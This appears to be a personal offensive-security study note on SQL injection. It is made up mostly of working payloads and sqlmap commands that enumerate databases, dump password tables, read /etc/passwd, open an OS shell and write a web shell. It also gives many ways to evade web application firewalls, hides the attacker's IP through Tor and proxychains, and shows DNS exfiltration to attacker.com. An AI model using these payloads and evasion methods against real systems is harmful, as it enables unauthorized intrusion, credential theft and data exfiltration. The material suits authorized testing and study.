Look for input fields and URLs that have parameters
- username = Ahmed , Password = 12345
- -> username = Ahmed' --   || Ahmed'; -- 
- -> username=' OR 1=1 --   || ' OR 1=1; --


`LIMIT 2` > only retrieve two rows
`LENGHT (password) = 4`

### UNION-based Attack
`password = pass123' UNION SELECT username, passwird FROM Users;--`
### ORDER BY
The `ORDER BY` clause is often used in **SQL Injection (SQLi) attacks** to determine the number of columns in the database table before performing **UNION-based SQL Injection**.
```sql
http://example.com/products?category=1 ORDER BY 1-- 
http://example.com/products?category=1 ORDER BY 2-- 
http://example.com/products?category=1 ORDER BY 3-- 
http://example.com/products?category=1 ORDER BY 4--  (Error)

```
then the number of columns of 3.
```sql
http://example.com/products?category=1 UNION SELECT 1,2,3--
```

--------------------------------
## Extracting Table Names Across All Databases

```sql
UNION SELECT 1, (SELECT table_name FROM information_schema.tables LIMIT 8,1), 3-- -
```
 - `LIMIT` **is required** to fetch a **specific row**.
- Without `LIMIT`, you would get **all table names at once**, which may cause errors.
> what if i wrote 1 column? If the original query expects **3 columns**, this will fail because **only 1 column** (`table_name`) is selected.
    The `UNION` operator requires the **same number of columns** in both queries.(The **original SELECT statement**)

## Extracting Tables in the Current Database
```sql
UNION SELECT 1,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 7,1),3-- -
```
## Extracting Column Names of a Specific Table
```sql
UNION SELECT 1,(SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 3,1),3-- -
```


### Error-based attack
```password = pass123' UNION SELECT 1, CONVERT ((SELECT Password FROM Users WHERE Username="admin"), DATE);--```

```sql
IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)
```

```sql
' AND 1=CONVERT(INT, (SELECT @@version));--
```

```sql
' AND EXTRACTVALUE(1, CONCAT(0x0a, @@version));--
```

### Boolean-based attack
`password= pass123' UNION SELECT Id FROM Users WHERE Username = 'admin' and SUBSTR(Password,1,1) = 'a' ;--`
if it returns data then you now have the id and brute force over the password to get it too
or we can use RLIKE : `RLIKE "(^)[a].*";`
```sql
' OR 1=1 --  (Always True) ✅
' OR 1=2 --  (Always False) ❌
```
If the first query returns a different response than the second, the application is vulnerable!
### Second-order SQL attack
When user input gets stored into a database, then retrieved and used unsafely in a SQL query. Even if the application handles the input properly when it's submitted by the user but the application deals with the data that came from the database as safe.
**how to exploit them** :
let's say we will try on the username.
- make the username like : `"ma133' UNION SELECT username, passwird FROM Users;--"`
- then try to access an end point where the application retrieve the username form it's database 
# Arjun
designed to discover **HTTP parameters**
`arjun -u "http://example.com/page.php"`
`arjun -u "http://example.com/page.php" -m POST` > **Specify HTTP method (GET/POST)**
`arjun -u "http://example.com/page.php" -H "Cookie: session=1234"` > **Include headers (e.g., cookies or authorization tokens)**
`arjun -u "http://example.com/page.php" -w /path/to/wordlist.txt` > **Use a custom wordlist**
`arjun -u "http://example.com/api" -j '{"key":"value"}'` > **Test for parameters in JSON data (for APIs)**
JSON should be in POST request > right click + change request method + edit content type and write `application/json` + add JSON in the body; eg: { "id" : 1}
and then delete 1 and add * and send it to sqlmap
# SQLMAP
`sqlmap -u <target_url>`
`sqlmap -u <target_url_?offset=1> -p offset`
`sqlmap -r file.txt` > put * 
 `sqlmap -u "http://example.com/page.php" --data="id=1" --method=POST` > **Specify HTTP method (GET/POST)** 
 `sqlmap sqlmap.py -u http://example.com/login --data="username=admin&password=pass123"`
 The output of this command should be used in the HTTP request body using burp suite
### examples on POST Requests:
 - **User Login Form**
 - **Search Function** > `sqlmap.py -u http://example.com/login --data="query=test"`
 - **Feedback Submission** 
 `sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=1234"` > **Specify cookies for authentication** 
 or > `sqlmap -u "http://example.com/page.php" -H "Cookie:id=*"` , `sqlmap -u "http://example.com/page.php" -H "Cookie:*"` *or any header no just cookie*
 `sqlmap -u "http://example.com/page.php?id=1" -v 6` , `sqlmap -u "http://example.com/page.php?id-1" --level 5 --risk 3` > **Increase verbosity**
 `sqlmap -u "http://example.com/page.php?id=1" --dbs` > If the target is vulnerable, `sqlmap` will attempt to retrieve a list of all databases available on the database server.
 `sqlmap -u "http://example.com/page.php?id=1" -D <database_name> --tables` > **Enumerate tables in a specific database**
 `sqlmap -u "http://example.com/page.php?id=1" -D <database_name> -T <table_name> --dump` > **Dump data from a specific table**
 `sqlmap -u "http://example.com/page.php?id=1" --dump-all` > **dump all data** **from the target database** 
 `sqlmap -u "http://example.com/app.php?id=10" -p id --dbms=PostgreSQL --dump --tables -T users --columns -C username,password --batch --headers="X-Forwarded-For: 127.0.0.1\nAuth-Token: abcdef12345"` :
 - `--dump`: Dumps database content.
- `--tables`: Lists tables to identify which ones to target.
- `-T users`: Targets the 'users' table specifically.
- `--columns`: Lists columns of the specified table.
- `-C username,password`: Specifies the columns to extract data from.
- `--headers="X-Forwarded-For: 127.0.0.1\nAuth-Token: abcdef12345"`: Includes custom HTTP headers necessary for maintaining sessions or access controls that require specific tokens or client IP forwarding.

if it's not working try encode it > ctrl + u
![[Pasted image 20250322164625.png]]
# SQLMAP Techniques : 
- B: Boolean-based blind
- E: Error-based
- U: Union query-based
- S: Stacked queries
- T: Time-based blind
- Q: Inline queries
to use all => `--technique=BEUSTQ`, or u can just write any letter of them
------------------------------------------
- SQLMap can **identify** the OS and database details to **prepare for privilege escalation**.
`sqlmap -u "http://example.com/index.php?id=1" --current-user --current-db --hostname --is-dba` > if `is-dba` returns **True**, you have **database admin privileges**
- If the database has high privileges, SQLMap can **execute system commands**.
`sqlmap -u "http://example.com/index.php?id=1" --os-shell` > This gives you **command-line access** if possible.
- If the database user has **high privileges**, you can try escalating control.
`sqlmap -u "http://example.com/index.php?id=1" --privileges` > If you see `FILE`, `EXECUTE`, or `SUPER`, you can **read/write files**.
**Try Writing a Web Shell**:
`sqlmap -u "http://example.com/index.php?id=1" --file-write="/var/www/html/shell.php" --file-dest="/var/www/html/shell.php"` >Now, access your **webshell** at `http://example.com/shell.php`.
- `sqlmap.py -m /path/to/targets.txt` > Allows testing of multiple targets listed in a text file. Each line in the file should contain one target.
- `sqlmap.py -g "inurl:index.php?id="y` > Uses Google dorking to find and process target URLs. SQLMap automates the search for URLs using specified Google dorks.
- 
# Tampering
Tampering in SQLMap refers to **modifying or obfuscating SQL injection payloads** to bypass security mechanisms such as **Web Application Firewalls (WAFs), Intrusion Detection Systems (IDS), or filters**.
SQLMap provides **tamper scripts** that can be applied using the `--tamper` option to **alter the payload structure**, making it harder for security tools to detect and block the attack.
``sqlmap --list-tampers`` > To list all available tamper scripts
## Common Tamper Scripts
`sqlmap -u "http://example.com/login.php?id=1" --dbs --tamper=space2comment,randomcase,charencode`
**space2comment.py** :
- Replaces spaces with comments (`/**/`) to evade WAFs.
- `SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM users;` will be: `SELECT/**//*FROM/**/users/**/WHERE/**/id/**/=/**/1/**/UNION/**/SELECT/**/username,password/**/FROM/**/users;`
**randomcase.py** :
- Randomizes the case of SQL keywords to bypass case-sensitive filters.
**charencode.py** :
- Encodes SQL characters into their **CHAR()** equivalent to avoid detection.
**base64encode.py** :
- Encodes payloads in **Base64** and decodes them at runtime.
**between.py** :
- Replaces `=` with `BETWEEN` to avoid simple WAF rules.
 *search for more scripts* 
# How to Identify and Bypass a Firewall (WAF)
## WafW00f
`wafw00f http://example.com` > output :
`Target: http://example.com
`Detected WAF: Cloudflare`

## Bypassing the Firewall (WAF)
### Using SQLMap with Tamper Scripts
`sqlmap -u "http://example.com/index.php?id=1" --dbs --tamper=space2comment,randomcase,charencode`
- **Works well against** ModSecurity, Cloudflare, and generic WAFs.
### Using HTTP Parameter Pollution
`sqlmap -u "http://example.com/index.php?id=1&id=2" --dbs`
- Some WAFs filter `id` but not multiple parameters.
### Bypassing WAF Using Out-of-Band (OOB) Attacks
Some WAFs block inline responses but may allow **DNS exfiltration**.  
Use **OOB techniques** to extract data: `sqlmap -u "http://example.com/index.php?id=1" --dbs --dns-domain=attacker.com`
### IP Spoofing
Some WAFs block **specific IPs**. Use **TOR & ProxyChains** to change IP.
`sudo apt install tor proxychains4 -y`
`sudo service tor start`
`proxychains sqlmap -u "http://example.com/index.php?id=1" --dbs`

- `--hex`: Encodes payloads in hexadecimal format, another method to bypass WAF filters.
- `--delay=2`: Delays between each request to avoid triggering rate limits or suspicious activity alerts.
**alternatives to 1=1** :
```sql
index.php?id=1+OR+1=repeat(1,1)--
```

```sql
/index.php?id=1+OR+1=insert(1,1,1,1)--
```

```sql
/index.php?id=1+OR+1=replace(1,1,1)--
```

```sql
/index.php?id=1+OR+1=right(1,1)--
```

```sql
/index.php?id=1+OR+replace(insert(1,1,1,1),1,1)=repeat(1,1)--
```


```sql
SELECT login FROM users WHERE id={`foo`/*bar*/(SELECT 2)};
```
- This works **because WAF might not recognize** `(SELECT 2)` inside `{}`.
```sql
SELECT login FROM users WHERE id=sEleCt/*foo*/1;
```

**using subqueries to bypass WAF** :
```sql
UNION SELECT user, password FROM users
-- blocked
```

```sql
1 || (SELECT user FROM users WHERE user_id = 1) = 'admin'
-- bypass
```

```sql
1 || (SELECT user FROM users WHERE user_id = 6) = 'admin'
-- blocked
```

```sql
1 || (SELECT user FROM users LIMIT 1 OFFSET 5) = 'admin'
-- bypass
```

```sql
1 || (SELECT user FROM users GROUP BY id HAVING id=6) = 'admin'
--bypass
```

**Using `-` to manipulate conditions**:
```sql
SELECT * FROM users WHERE name = 0-0;
```

**try modifying some parameters** :
```sql
User-Agent: ' OR 1=1;--
```

## some techniques that sqlmap doesn't use
### Buffer Overflow
Some WAFs have buffer length limits when processing SQL queries. Overloading the WAF’s buffer can cause unexpected behavior.
```sql
?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
```
`0xA * 1000` causes an overflow if the WAF buffer is too small. This can lead to crashes or bypasses.
### HTTP Parameter Fragmentation (HPF)
Splitting SQL queries across multiple parameters.
```sql
/?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--
```
Some WAFs might check parameters separately, failing to detect the full SQL injection.
### HTTP Parameter Contamination (HPC)
```sql
?id=1;SELECT/*&id=*/password/*&id=*/FROM users
```
Different web servers process duplicate parameters differently.
### Breaking SQL Keywords with Operators
```sql
'se'+'lec'+'t' * from users -- (Bypassing SELECT detection)
'Un'+'Io'+'N Se'+'Le'+'Ct' 1,2,3 -- (Bypassing UNION SELECT detection)
[Se][Le][Ct] * from users -- (SQL Server)
id=1+(UnI)(oN)+(SeL)(EcT) 1,2,3 --
%S%E%L%E%C%T * FROM users --
SELECT 0x70617373776F7264 FROM users; -- (password in hex)
sElEcT * fRoM users;
UNI/**/ON SEL/**/ECT 1,2,3;
SELECT/**/password/**/FROM/**/users;

```

![[Pasted image 20250404071129.png]]
### Unicode Representation of Special Characters
Certain **critical SQL characters** (such as `'`, `"`, `--`, and `;`) can be **encoded in Unicode** to avoid detection.
- Some WAFs detect `'` (ASCII) **but not its Unicode equivalent**.
- The database normalizes Unicode internally, interpreting `%D6%5C'` as `'`.
- `UNION` can be obfuscated as `%55%6e%69%6f%6e` (which is the hex representation of "UNION").
- The bypass technique here is to obfuscate the `UNION` keyword using `%6f` (the hex representation of `o`), allowing the attacker to bypass the filter:
    - **Bypass Example**: `vuln.php/trackback?inject=UNI%6fN SELECT`

### Other Unicode Encoding Variations
**Using Full-Width Unicode Characters** Some Unicode characters **look identical** to normal ASCII characters but have **different byte representations**.

| `"` | `＂` |
| --- | --- |
| `'` | `＇` |
| `–` | `－` |
| `/` | `／` |
| `\` | `＼` |
### Double Encoding for SQL Injection
Some WAFs block **single encoding** but fail to detect **double encoding**.
```sql
?id=1%25%32%37%20AND%201=1--
```
`%25%32%37` is **double-encoded `%27`**, which is `'`.
### Using UTF-8 Overlong Encoding
Some databases **normalize UTF-8 overlong encoding**, while some WAFs **don’t**.
```sql
?id=1%C0%AF' OR 1=1 --
```
`%C0%AF` is an **overlong encoding for `/`**, bypassing WAFs that block `/`.
### e107 CMS
**What it does:**  
It defines an array of suspicious strings (like `'`, `;`, `/UNION/`, `AS`) and blocks the request **if any of them appear in the URL query string**.
✅ **How to Bypass:**  
We use **obfuscated versions** of `UNION SELECT` so that the exact string doesn’t appear.
```sql
UN/**/ION SE/**/LECT
```
### PHP-Fusion
**What it does:** It applies a **case-insensitive regex match** on the SQL query to look for the **exact pattern**:
✅ **How to Bypass:** Split the keyword so the pattern `union.*select` isn't matched.
```sql
UNIunionON SELECT
```
### WAFs that remove whitespace or comments
Some advanced WAFs **strip whitespace** or **collapse comments**, so tricks like `UN/**/ION` don’t work. Use **tab**, **newlines**, or unusual spacing:
```sql
UNION/**/SELECT
UNION%0ASELECT   -- (newline)
UNI%09ON SEL%09ECT -- (tab)
```
### MySQL-specific obfuscation
`/*!50000SELECT*/` → This is a **MySQL versioned comment**, which runs the code only if MySQL version ≥ 5.0.
```sql
UNION /*!50000SELECT*/ 1,2,3
```
The filter might not see `SELECT`, but MySQL executes it!
### Using `INFORMATION_SCHEMA`
```sql
from information_schema.tables --Blocked
FROM INFOrmation_sche/**/ma.TABLES --Bypass
```
### Use of `greatest()` to bypass filtered comparison operators (`<`, `>`, etc.)
In **Boolean-based blind SQL injection**, we often use operators like `<`, `>`, `<=`, `>=` to guess ASCII values of characters in data (like the username):
```sql
ascii(mid(user(), 1, 1)) < 150 --Blocked
SELECT greatest(ascii(mid(user(),1,1)),150)=150; --Bypass
```
### `substr(user() from x for y)` — bypassing comma filters
Some WAFs **block the use of commas**, especially in functions like:
```sql
ascii(mid(user(),1,1)) = 109 --Blocked
ascii(substr(user() from 1 for 1)) = 109 --Bypass
```



```sql
damn’UnIUNIONon/**/sESELECTlect/**/1,2,user(),4&&1=’1 --getting user
damn’UnIUNIONon/**/sESELECTlect/**/1,2,database(),4&&1=’1 --getting database
damn’UnIUNIONon/**/sESELECTlect/**/1,2,File_priv,4/**/from/**/mysql.user/**/where/**/user=user()||1=’1 --getting privlage
damn’UnIUNIONon/**/sESELECTlect/**/1,2,load_file(‘/etc/passwd’),4||1=’1 --reading passwd
```



------------------------------------------------

`--random-agent` > to avoid blocking
`--referer="Google"` > same as above
`--drop-set-cookie` > to avoid sending cookie
`--ignore-code <no of code>` > to avoid the error codes 

---
## MUST SEE
- https://www.youtube.com/watch?v=0tqF7lx_dBg


[[SQLI]]